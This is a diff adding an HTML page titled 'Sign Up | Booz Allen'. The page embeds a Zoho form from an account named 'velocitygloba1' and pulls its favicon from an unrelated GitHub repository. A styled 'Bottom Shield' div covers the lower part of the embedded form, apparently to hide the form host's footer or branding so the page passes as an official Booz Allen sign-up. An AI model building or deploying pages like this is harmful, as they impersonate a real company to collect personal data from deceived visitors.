@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Sign Up | Booz Allen</title>
+    <link rel="icon" href="https://raw.githubusercontent.com/xwzwx/veloc-assets/refs/heads/main/booz-allen.png">
+    
+    <style>
+        /* === 1. ALLOW MAIN PAGE TO SCROLL BUT HIDE SCROLLBAR === */
+        html, body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #0b1118; 
+            
+            /* Hides outer scrollbar in Firefox & Edge/IE */
+            scrollbar-width: none; 
+            -ms-overflow-style: none; 
+        }
+
+        /* Hides outer scrollbar in Chrome, Safari, and modern Edge */
+        html::-webkit-scrollbar, body::-webkit-scrollbar {
+            display: none;
+        }
+
+        /* === 2. THE TALL WRAPPER FIX === */
+        .iframe-wrapper {
+            position: relative; 
+            width: 100%;
+            height: 1200px; 
+            overflow: hidden; 
+            
+            /* Magic line that guarantees buttery-smooth finger scrolling on iPhones! */
+            -webkit-overflow-scrolling: touch; 
+        }
+
+        iframe {
+            border: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* === 3. THE BOTTOM SHIELD (DESKTOP) === */
+        .footer-blocker {
+            position: absolute;
+            bottom: 0; 
+            left: 0;
+            
+            /* Dodges the physical scrollbar on PC/Laptops */
+            width: calc(100% - 18px); 
+            
+            height: 210px; 
+            z-index: 50; 
+            background-color: #0b1118; 
+            pointer-events: none; 
+        }
+
+        /* === 4. RESPONSIVE MOBILE FIX === */
+        @media screen and (max-width: 600px) {
+            
+            .iframe-wrapper {
+                /* Text wraps on mobile, making the form taller. 
+                   Make sure this is tall enough to reveal the Sign Up button! */
+                height: 1500px; 
+            }
+
+            .footer-blocker {
+                height: 240px; 
+                
+                /* CRITICAL MOBILE FIX: Phones do not have 18px physical scrollbars. 
+                   We change this back to 100% so it perfectly touches the right edge of the phone! */
+                width: 100%; 
+            }
+            
+        }
+    </style>
+</head>
+<body>
+
+    <div class="iframe-wrapper">
+        
+        <!-- The Bottom Shield -->
+        <div class="footer-blocker"></div>
+
+        <!-- Your Zoho Form -->
+        <iframe src="https://forms.zohopublic.com/velocitygloba1/form/VelocityGlobal/formperma/i3yb8CYWIXQQ_jOulDPdEU6vsbpveDcK3olsdhoNqqU">
+        </iframe>
+
+    </div>
+    
+</body>
+</html>
